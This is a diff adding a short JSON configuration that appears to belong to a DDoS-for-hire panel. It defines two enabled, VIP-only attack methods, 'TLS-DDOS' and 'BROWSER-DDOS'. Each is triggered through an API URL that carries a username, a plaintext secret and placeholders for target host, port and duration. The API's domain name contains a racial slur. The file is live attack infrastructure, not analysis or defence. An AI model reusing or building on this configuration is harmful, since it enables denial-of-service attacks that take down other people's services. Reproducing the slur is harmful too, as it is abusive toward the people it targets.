@@ -1,0 +1,16 @@
+{
+  "cl-http": {
+    "urls": [
+      "http://nigga.com?username=adore&secret=HxLOKyTEwGuJ&host=<host>&port=<port>&time=<duration>&method=TLS-DDOS"
+    ],
+    "access": ["vip"],
+    "Enabled": true
+  },
+  "cl-browser": {
+    "urls": [
+      "http://nigga.com?username=adore&secret=HxLOKyTEwGuJ&host=<host>&port=<port>&time=<duration>&method=BROWSER-DDOS"
+    ],
+    "access": ["vip"],
+    "Enabled": true
+  }
+}
